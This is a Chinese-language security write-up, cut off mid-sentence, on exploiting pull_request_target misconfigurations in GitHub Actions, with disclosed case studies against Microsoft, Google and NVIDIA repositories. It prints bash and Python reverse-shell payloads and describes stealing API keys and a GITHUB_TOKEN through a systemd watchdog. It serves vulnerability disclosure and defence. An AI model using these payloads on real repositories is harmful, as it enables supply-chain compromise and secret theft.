---
title: Pull_request噩梦第二弹：如何通过GitHub Actions漏洞实现RCE和供应链攻击
url: https://mp.weixin.qq.com/s/njVDgOiQ-BtqV3ClOgx8lA
source: Doonsec's feed
date: 2026-03-07
fetch_date: 2026-03-08T04:04:44.925826
---

# Pull_request噩梦第二弹：如何通过GitHub Actions漏洞实现RCE和供应链攻击

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdfAJicIyokaDhIOYeU6uSBz1SGrqKhxsxxaX1xh5fRDO9SdTRKE9fbdw5kgE9BSwEsm8Ch6fTqEFZpsoibfVUBicQia6hwCKRbd4k/0?wx_fmt=jpeg)

# Pull\_request噩梦第二弹：如何通过GitHub Actions漏洞实现RCE和供应链攻击

幻泉之洲

![]()

在小说阅读器中沉浸阅读

> 一个来自Fork的Pull Request，就能攻破微软、谷歌、英伟达等巨头的代码仓库。这篇深度分析揭露了普遍存在的GitHub Actions高危配置错误，分析了攻击者如何以此实现远程代码执行、窃取密钥，并提出了具体的防御策略。

## 执行摘要

我们仅仅通过一个来自Fork仓库的Pull Request，就成功入侵了微软、谷歌、英伟达等多家科技巨头的代码库。根据我们掌握的数据，这个问题很可能波及成千上万个存在风险的仓库。

这项研究阻止了钓鱼攻击、供应链攻击、横向渗透以及品牌声誉严重受损等一系列连锁风险。一个Pull Request就够了——我们可以写入主分支、推送恶意包、创建部署、管理PR、窃取令牌密钥，甚至劫持Cookie或分发恶意软件。

接下来的章节会深入剖析我们是如何、以及为何能够执行这次高效的GitHub攻击。这个由配置错误演变而来的严重漏洞，让恶意黑客过去能、现在仍然可能获得什么。

## 背景：被“玩坏”的Pull Request

核心在于，使用`pull_request_target`的GitHub Actions工作流，**绝不应该**在没有适当验证的情况下检出不可信的代码。一旦这么做了，就面临着被完全攻陷的风险。

实际上，GitHub早在2021年8月就公开提醒过这个问题（github-actions-preventing-pwn-requests/）。但令人担忧的是，许多仓库至今仍未修复，其中不乏科技巨头旗下的。让我们感到意外的不只是有这么多人误解了`pull_request_target`的用法，还有他们纠正工作流的无力感。

研究后期，我们在测试范围超出GitHub官方建议之外时，发现了前所未见的情况：即使应用了看似正确的补丁，仓库依然脆弱。继续往下读，你会了解根本原因，以及如何保护你的工作流免受有针对性的攻击。文章末尾，我们会总结最佳实践和缓解策略，帮助你保护代码和密钥安全。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdN4aHsLaWhWNYkdgD9HEH3Z3gxmWTF2XAyvoVyiaCrYoJUUdA31RUibjbsWJ4vPoAeBM2Pvf6XqAdtjokzibkcR1nc00raTVzMkE/640?wx_fmt=webp&from=appmsg)

## Git(f)tHub：是福是祸？

GitHub早已不只是代码托管平台，它现在是互联网上最大的攻击面。如果你还没意识到这一点，那么你已经落后了。安全事件比以往任何时候都近。现实就是这么残酷。

GitHub已经演变成一个完整的开发平台，让用户能在单一环境里管理整个软件开发生命周期。从Issues、Projects这样的规划工具，到Codespaces开发环境、Copilot AI编程助手，再到GitHub Actions驱动的CI/CD流水线，以及通过GitHub Pages、Vercel或Netlify的部署选项——开发者现在完全不用离开GitHub就能完成编码、测试和部署。

这种灵活性和强大功能对开发者是好事，对攻击者则是天大的好消息。GitHub成了“福祸相依”的双刃剑：从密钥泄露、白盒研究、冒充贡献者、劫持维护者账户、污染Actions和Apps，到泄露企业数据，最后再到利用工作流漏洞。在GitHub上犯错似乎是难免的，而攻击者永远在旁边等着捡便宜。

## GitHub Actions的核心问题

Actions是GitHub集成的CI/CD解决方案。2018年10月推出时，其初衷是提供原生自动化，减少对接Jenkins、CircleCI这类外部服务的摩擦。对开发者来说，不用维护外部基础设施确实带来了变革，但也付出了代价。

前几天在办公室，我们还在头脑风暴攻击者会如何滥用GitHub。最后得出一个非常明显却又令人不安的结论：**任何来自外部贡献者的Pull Request，都会触发代码执行**。在今天看来这可能显而易见，但我们常常因习以为常而忽视它，习以为常的事情会让人觉得正常，哪怕它其实问题很大。

这个特性让Actions成了一种“RaaS”。别慌，这个词是我自己编的，但道理没错。通过`pull_request`系列触发器，Actions就变成了跑在GitHub替客户搭建的基础设施上的“远程代码执行即服务”——而这些基础设施可能存着敏感数据，并有权限访问代码和配置。

和过去基于Webhook的自动化流程不同，使用Actions，你可以轻松看到静态代码、运行时日志和工作流进度。下次创建新Actions工作流时，记住这一点。

## 攻击故事——实战案例

首先声明，我们相信并完全支持公平和负责任的漏洞披露，并将永远为此努力协作。以下每个案例研究都已修复。有些事件仍在披露流程中，可能在最近几天公开，所以请保持关注。

向所有下文提到的厂商，我借此机会代表我个人和社区，感谢你们宝贵的合作与支持。

**前言：这不是演习**

你接下来要读到的不是理论。这不是安全研究员发现但从未用过、恶意攻击者也永远用不了的成果。这些是真实的，而且会长期存在。

下面的部分内容需要一定技巧才能成功，但识别和利用起来其实很简单。说实话，有些发现让我的心跳都加快了。前一分钟你还在创建一个简单的Pull Request，下一分钟就从一家财富100强企业的网站上窃取到了Cookie。我这么坦诚，是想让你看到风险到底有多严重。

我们开始吧。

### 攻陷microsoft/symphony

**概述**

通过来自Fork仓库的一个Pull Request（github.com/microsoft/symphony/pull/315/files），我们从GitHub Actions运行器上拉取了一个反向Shell，并利用可用的GitHub令牌向源仓库推送了恶意代码。

这个仓库存在多个错误配置的工作流，都使用了`pull_request_target`触发器。在修复前，多数工作流会检出不可信代码，并明确请求仓库内容的写入权限。

这造成了重大漏洞，可能让攻击者污染一个负责为Azure上基础设施即代码推荐最佳CI/CD实践的项目（microsoft/symphony/blob/main/README.md）。由此产生的供应链威胁可能引发下游攻击和严重的品牌损害。微软的安全公告（microsoft/symphony/security/advisories/GHSA-pq5r-g36r-rpx7）给这个问题分配了CVE-2025-61671，CVSS关键评分高达9.3，这说明他们非常重视。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibc0xhj5abeI56YS1xPxY50Iv79HXQXxZggJj2ZEibwQ5p84iaj88yaic4FYgz1TMGdkZgrnRfy1ulZdIgichllOcEzCggBQaWmedYw/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibetia9LvHOiamfAsPhlUp4k2ZcicIuJkAJr9ZlRpjIP30DKTzAGm5k2APSd0XXVR2ElP7stApUiaDwIvdMBibTvU4KJlG42ZV4M0LZk/640?wx_fmt=webp&from=appmsg)

**复现步骤**

一个易受攻击的使用了`pull_request_target`的工作流`.github/workflows/workflow.pr.terraform.yml`，其中有一个名为`Validate`的作业，它使用了可复用的工作流`.github/workflows/template.terraform.validate.yml`。后者使用`actions/checkout@v5`，通过GitHub为每个PR自动创建的特殊合并引用`refs/pull/${{ github.event.pull_request.number }}/merge`，检出了PR内容。

这就允许攻击者修改`scripts/orchestrators`下的任何脚本以实现远程代码执行。我们选择修改的脚本是`scripts/orchestrators/setup-azcli.sh`。

bash -i >& /dev/tcp//
 0>&1

你可以看到，上述可复用工作流使用了细粒度权限块，设置了`contents: write`。这意味着工作流在一个临时的`ubuntu-latest` GitHub Actions运行器上运行，GitHub为其提供了一个同时具备读写权限的`GITHUB_TOKEN`。

**攻击流程**

我们保留了深入的技术利用细节，将在即将举行的会议演讲中逐步演示如何向微软的源仓库推送新分支，以及如何入侵微软租户内的Azure服务主体。

**协调披露时间线**

* 2025-08-28：通过研究门户向微软报告
* 2025-08-28：微软安全响应中心（MSRC）开案调查
* 2025-08-29：微软作为初步应对，禁用了该仓库的Actions
* 2025-09-03：MSRC确认了报告中的行为并开始调查
* 2025-09-03：主要维护者向仓库部署了修复
* 2025-09-15：MSRC报告已发布修复
* 2025-09-26：微软为该问题分配了CVSS 9.3关键评分

### 攻陷googlecloudplatform/ai-ml-recipes

**概述**

通过来自Fork仓库的一个Pull Request（github.com/GoogleCloudPlatform/ai-ml-recipes/pull/101/files），我们从GitHub Actions运行器上拉取了一个反向Shell，利用可用的GitHub令牌向源仓库推送恶意代码，并窃取了一个Gemini API密钥。

这个仓库中错误配置的工作流是`.github/workflows/autodoc.yml`。修复前，它使用了`pull_request_target`触发器，并用`${{ github.head_ref }}`检出了PR的源分支，同时拥有`contents: write`和`pull-requests: write`权限。

这造成了严重漏洞，攻击者可以借此向源仓库推送新分支，并威胁受保护的主分支。我们稍后会更详细地讨论这些机制和缓解措施。供应链威胁的影响范围很广，对于一个向谷歌客户提供入门Jupyter Notebooks的项目（GoogleCloudPlatform/ai-ml-recipes/blob/main/README.md）会产生重大下游影响。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfBLQFKP5z8xN8cMKokaBAaFM69XDLrBPibG5RXAamicHB6c1L8prczHwD4wdxsAfgOTKgw5ibyPNuHiacOhWh4cEIEBgWldDFITvA/640?wx_fmt=webp&from=appmsg)

**复现步骤**

易受攻击的工作流`.github/workflows/autodoc.yml`有一个名为`validate-and-autofix-pr`的作业，它使用`actions/checkout@v3`检出PR内容，并执行`.ci/scripts`下的几个脚本。我们修改的脚本是`.ci/scripts/generate_docs.py`（它使用LLM为修改后的笔记本生成自动化文档）。

import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("",
));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])

`${{ secrets.GEMINI_API_KEY }}`作为环境变量嵌入了同一个作业中。因此，利用这个工作流，我们不仅能访问特权GitHub令牌，还能轻松地从被攻陷的GitHub运行器中窃取密钥。

**攻击流程**

与上一个案例类似，我们保留了深入的技术利用策略，将在即将举行的会议演讲中逐步演示如何向谷歌的源仓库推送新分支、如何升级到向主分支推送代码，以及如何窃取Gemini API密钥。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfE0SkWntd2LhO0w6iaL63TnFKwHMcs49hIDFZ5Snicnxe5mDGUAHamOv9oqIQoVBuqTMWW7ZPydZ8UvO69GgrzOJCUaQgUzxg2M/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibcyEPicVdibWB6FDticX6ZZz7cJKbibEMH61zbLxWP4voR9GsUjcicqE9dCSsibbJOpDvSM3XarqSYTOjibXeick6Yp0thUkOqsoZxxz6g/640?wx_fmt=webp&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdrzTRib3HTkQYt9KfLsdFPwibB5HBVnSSKCgfHRtMew4VgeWUJuibTUq4NwAIhQuznqlaCDWrggacRcKB1CjFxhHzhiaTy8ns3CN4/640?wx_fmt=webp&from=appmsg)

**协调披露时间线**

* 2025-09-01：通过Google Bug Hunters向谷歌报告
* 2025-09-02：谷歌作为初步应对，完全移除了`pull_request_target`触发器
* 2025-09-02：主要维护者向仓库部署了修复
* 2025-09-02：谷歌接受了我们的发现，回复了著名的 🎉 Nice catch!
* 2025-09-13：谷歌报告已发布修复

### 攻陷nvidia/nvrc

**概述**

通过来自Fork仓库的一个Pull Request（github.com/NVIDIA/nvrc/pull/48/files），我们从一台自托管的、使用`g5g.metal`实例类型的GitHub Actions运行器上拉取了一个反向Shell。这样的入侵可能让恶意攻击者发起拒绝服务攻击、挖矿，并在英伟达的云环境中横向移动。

这个仓库中错误配置的工作流是`.github/workflows/ci-on-push.yaml`，它使用了`pull_request_target`触发器并调用了可复用工作流`.github/workflows/ci.yaml`，后者使用了强大的计算资源（每月约2000美元）。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfsZaia4yYjlYjdsaeLDS53melLia4NkB2ukXOmTbSbNcofoWHyLHwiaviaNkg2m1dRPAsOqFmh301twMuss0XibCKHicfW4HhIyf3vk/640?wx_fmt=webp&from=appmsg)

**复现步骤**

上述可复用工作流使用了带`${{ github.event.pull_request.head.sha }}`的`actions/checkout`。这让攻击者能够通过修改`tests/install_rust.sh`来滥用`build-asset`作业，从而在运行器上实现远程代码执行。

bash -i >& /dev/tcp//
 0>&1

**攻击流程**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibfV0ALOMNWca4yWRK8ra7eXXqpCT2Tk5M1cgNlShXbyXFbSZzObNDSxVasgbSfKxZicUJhDK9eiaSMZVw8NbIwicfht5O8A2TMZy4/640?wx_fmt=webp&from=appmsg)

进入运行器后，我们获取了实例元数据服务令牌。这里我们不会详述任何后续的横向移动操作。

此外，我们确信GitHub令牌可以部署软件包，因为权限设置里包含了`packages: write`。但提取这个GitHub令牌很困难，因为`persist-credentials: true`意味着GitHub Actions在`actions/checkout`步骤后会移除凭据。

我深入研究了一下`actions/checkout`的工作原理，发现它将凭据注入到了`.git/config`中。当启用`persist-credentials`时，作为一项安全措施，该动作会在之后从`.git/config`中移除这些凭据。

由于这是自托管运行器，每个工作流都在同一台机器上执行。考虑到这一点，我们创建了一个监视`.git/config`的看门狗，将其内容记录到一个文件里，以便在运行器下一次执行时检查。我们实现了一个每半秒运行一次`git config --list`的小型Bash脚本，将其安装为systemd服务，在第二次工作流运行时，该服务成功暴露了令牌。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibfWL76NbbpZL6TqXgz0ZnpoNC3wBOgre6LF0EPibeB8X4ydXgCzObLx7QDNmGWmFIYy56yDsSqvLfjXssUcBL1tkTnQVDRBWxiaA/640?wx_fmt=webp&from=appmsg)

幸运的是，尽管令牌被暴露，它并不包含创建包的权限，因为仓库的强制权限明确省略了`packages: write`。

然而，攻击者仍可能通过滥用IAM权限、从EC2实例探测网络可达服务来进行横向移动，并且可以运行与计算相关...